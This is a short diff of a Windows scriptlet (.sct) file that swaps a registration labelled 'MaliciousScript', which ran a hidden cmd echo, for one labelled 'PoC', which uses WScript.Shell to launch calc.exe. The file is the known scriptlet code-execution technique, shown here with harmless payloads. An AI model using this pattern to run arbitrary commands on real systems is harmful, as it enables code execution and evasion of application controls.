@@ -1,12 +1,12 @@
+<?XML version="1.0"?>
 <scriptlet>
-  <registration 
-    progid="MaliciousScript"
-    classid="{F414C260-6AC0-11CF-B6D1-00AA00BBBB58}">
-    <script language="JScript">
-      <![CDATA[
-        var WshShell = new ActiveXObject("WScript.Shell");
-        WshShell.Run("cmd.exe /c echo Hello, World!", 0);
-      ]]>
-    </script>
-  </registration>
+<registration 
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+	<script language="JScript">
+		<![CDATA[
+			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");	
+			]]>
+</script>
+</registration>
 </scriptlet>
